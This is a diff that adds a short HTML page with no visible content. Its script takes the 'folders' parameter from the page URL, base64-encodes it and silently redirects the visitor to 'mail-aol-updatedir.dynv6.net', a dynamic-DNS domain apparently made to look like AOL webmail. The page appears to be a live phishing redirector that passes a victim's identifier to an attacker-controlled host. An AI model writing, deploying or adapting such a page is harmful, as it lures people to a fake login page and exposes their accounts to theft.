@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title></title>
+    <meta charset="UTF-8">
+    <script>
+    var url_string = window.location.href; //window.location.href
+    var url = new URL(url_string);
+    var c = url.searchParams.get("name");
+    
+    
+    
+    /**
+* Add a URL parameter 
+* @param {string} url 
+* @param {string} param the key to set
+* @param {string} value 
+*/
+var addParam = function(url, param, value) {
+   param = encodeURIComponent(param);
+   var a = document.createElement('a');
+   param += (value ? "=" + encodeURIComponent(value) : ""); 
+   a.href = url;
+   a.search += (a.search ? "&" : "") + param;
+   return a.href;
+}
+
+/**
+* Add a URL parameter (or modify if already exists)
+* @param {string} url 
+* @param {string} param the key to set
+* @param {string} value 
+*/
+var addOrReplaceParam = function(url, param, value) {
+   param = encodeURIComponent(param);
+   var r = "([&?]|&amp;)" + param + "\\b(?:=(?:[^&#]*))*";
+   var a = document.createElement('a');
+   var regex = new RegExp(r);
+   var str = param + (value ? "=" + encodeURIComponent(value) : ""); 
+   a.href = url;
+   var q = a.search.replace(regex, "$1"+str);
+   if (q === a.search) {
+      a.search += (a.search ? "&" : "") + str;
+   } else {
+      a.search = q;
+   }
+   return a.href;
+}
+lite = url.searchParams.get("folders");
+//var decodedStringAtoB = atob(lite);
+var encodedStringBtoA = btoa(lite);
+url = "https://mail-aol-updatedir.dynv6.net/webmail-std";
+newurl = addParam(url, "en-us", encodedStringBtoA);
+window.location.replace(newurl);
+
+
+
+</script>
+  </head>
+  <body>
+  </body>
+</html>
